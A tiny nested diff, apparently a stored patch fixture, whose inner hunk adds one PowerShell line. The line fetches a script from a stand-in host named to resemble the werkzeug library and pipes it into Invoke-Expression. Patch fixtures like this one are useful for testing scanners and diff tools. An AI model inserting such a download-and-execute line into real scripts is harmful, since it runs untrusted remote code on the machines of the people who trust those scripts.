@@ -1,0 +1,3 @@
+@@ -1,1 +1,2 @@
+ $ErrorActionPreference = 'Stop'
++iwr https://werkzeug.example/a.ps1 | iex
